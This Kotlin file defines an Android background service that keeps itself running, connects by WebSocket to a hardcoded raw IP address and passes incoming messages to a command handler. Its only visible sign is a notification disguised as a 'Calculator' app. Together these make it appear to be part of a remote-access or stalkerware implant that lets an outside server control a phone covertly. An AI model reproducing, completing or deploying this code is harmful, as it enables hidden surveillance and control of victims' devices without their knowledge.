package com.devicemanager

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class DeviceService : Service() {

    private lateinit var webSocketClient: WebSocketClient
    private lateinit var commandHandler: CommandHandler

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        
        commandHandler = CommandHandler(this)
        
        val prefs = getSharedPreferences("device_manager", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "http://65.109.188.172:3000") ?: ""
        
        webSocketClient = WebSocketClient(serverUrl, commandHandler)
        webSocketClient.connect()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocketClient.disconnect()
    }

    private fun createNotification(): Notification {
        val channelId = "device_service"
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Device Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Calculator")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
